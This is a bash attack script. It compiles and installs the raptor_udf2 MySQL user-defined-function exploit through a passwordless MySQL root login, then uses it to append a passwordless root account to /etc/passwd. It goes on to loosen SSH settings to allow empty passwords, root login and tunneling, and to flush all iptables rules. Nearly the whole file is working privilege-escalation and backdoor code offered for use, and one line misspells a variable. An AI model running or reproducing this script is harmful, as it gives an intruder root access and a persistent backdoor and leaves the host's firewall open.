#!/bin/bash

USERNAME=$1
if [[ $# -eq 0 ]];
then
	echo "Usage: ./$0 <new username>"
	exit
fi


echo "[*] First pasting the script ( ${PWD}/raptor_udf2.c )"

cat << EOF > raptor_udf2.c
/*
 * $Id: raptor_udf2.c,v 1.1 2006/01/18 17:58:54 raptor Exp $
 *
 * raptor_udf2.c - dynamic library for do_system() MySQL UDF
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * This is an helper dynamic library for local privilege escalation through
 * MySQL run with root privileges (very bad idea!), slightly modified to work
 * with newer versions of the open-source database. Tested on MySQL 4.1.14.
 *
 * See also: http://www.0xdeadbeef.info/exploits/raptor_udf.c
 *
 * Starting from MySQL 4.1.10a and MySQL 4.0.24, newer releases include fixes
 * for the security vulnerabilities in the handling of User Defined Functions
 * (UDFs) reported by Stefano Di Paola <stefano.dipaola@wisec.it>. For further
 * details, please refer to:
 *
 * http://dev.mysql.com/doc/refman/5.0/en/udf-security.html
 * http://www.wisec.it/vulns.php?page=4
 * http://www.wisec.it/vulns.php?page=5
 * http://www.wisec.it/vulns.php?page=6
 *
 * "UDFs should have at least one symbol defined in addition to the xxx symbol
 * that corresponds to the main xxx() function. These auxiliary symbols
 * correspond to the xxx_init(), xxx_deinit(), xxx_reset(), xxx_clear(), and
 * xxx_add() functions". -- User Defined Functions Security Precautions
 *
 * Usage:
 * $ id
 * uid=500(raptor) gid=500(raptor) groups=500(raptor)
 * $ gcc -g -c raptor_udf2.c
 * $ gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 * $ mysql -u root -p
 * Enter password:
 * [...]
 * mysql> use mysql;
 * mysql> create table foo(line blob);
 * mysql> insert into foo values(load_file('/home/raptor/raptor_udf2.so'));
 * mysql> select * from foo into dumpfile '/usr/lib/raptor_udf2.so';
 * mysql> create function do_system returns integer soname 'raptor_udf2.so';
 * mysql> select * from mysql.func;
 * +-----------+-----+----------------+----------+
 * | name      | ret | dl             | type     |
 * +-----------+-----+----------------+----------+
 * | do_system |   2 | raptor_udf2.so | function |
 * +-----------+-----+----------------+----------+
 * mysql> select do_system('id > /tmp/out; chown raptor.raptor /tmp/out');
 * mysql> \! sh
 * sh-2.05b$ cat /tmp/out
 * uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
 * [...]
 *
 * E-DB Note: Keep an eye on https://github.com/mysqludf/lib_mysqludf_sys
 *
 */

#include <stdio.h>
#include <stdlib.h>

enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};

typedef struct st_udf_args {
        unsigned int            arg_count;      // number of arguments
        enum Item_result        *arg_type;      // pointer to item_result
        char                    **args;         // pointer to arguments
        unsigned long           *lengths;       // length of string args
        char                    *maybe_null;    // 1 for maybe_null args
} UDF_ARGS;

typedef struct st_udf_init {
        char                    maybe_null;     // 1 if func can return NULL
        unsigned int            decimals;       // for real functions
        unsigned long           max_length;     // for string functions
        char                    *ptr;           // free ptr for func data
        char                    const_item;     // 0 if result is constant
} UDF_INIT;

int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error)
{
        if (args->arg_count != 1)
                return(0);

        system(args->args[0]);

        return(0);
}

char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message)
{
        return(0);
}

// milw0rm.com [2006-02-20]
EOF

echo "[*] Linking, etc..."
echo "+-CMDS:
|
|-gcc -g -c raptor_udf2.c
|-gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o lc
|------------------------------------------------------------------------------"
gcc -g -c raptor_udf2.c
gcc -g -shared -W1,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
echo "[*] You're gonna hit enter FIVE times..." 
mysql -u"root" -p"" -D"mysql" -e"create table foo(line blob)"
echo "[*] One...."
mysql -u"root" -p"" -D"mysql" -e"insert into foo values(load_file('/tmp/raptor_udf2.so'))" 
echo "[*] Two..."
mysql -u"root" -p"" -D"mysql" -e"select * from foo into dumpfile '/usr/lib/raptor_udf2.so'"
echo "[*] Three..."
mysql -u"root" -p"" -D"mysql" -e"create function do_system returns integer soname 'raptor_udf2.so'"
echo "[*] Four..."
mysql -u"root" -p"" -D"mysql" -e"select do_system('echo $USERNAME::0:0:root:/root:/bin/bash >> /etc/passwd')"
echo "[*] Five..."
echo "[*] Inserted [ $USERNAME::0:0:root:/root:/bin/bash ] into /etc/passwd..."
echo "[*] Opening up ssh a bit for easier access...."
echo "+-CMDS
|
|- PermitEmptyPasswords yes >> /etc/ssh/sshd_config
|- PasswordAuthentication yes >> /etc/ssh/sshd_config
|- PermitRootLogin yes >> /etc/ssh/sshd_config
|- GatewayPorts yes >> /etc/ssh/sshd_config
|- PermitTunnel yes >> /etc/ssh/sshd_config
|- AllowTcpForwarding  >> /etc/ssh/sshd_config
|----------------------------------------------------"
su -c  'echo "PermitEmptyPasswords yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  'echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  'echo "PermitRootLogin yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  'echo "GatewayPorts yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  'echo "PermitTunnel yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  'echo "AllowTcpForwarding yes" >> /etc/ssh/sshd_config' $USERNAME
su -c  '/etc/init.d/sshd restart' $USERNAME
echo "[*] Dropping the gates..."
echo "+-CMDS
|
|- /usr/sbin/iptables --flush
|-----------------------------"
su -c  '/usr/sbin/iptables --flush' $USERNMAE
echo "[*] Done"
exit
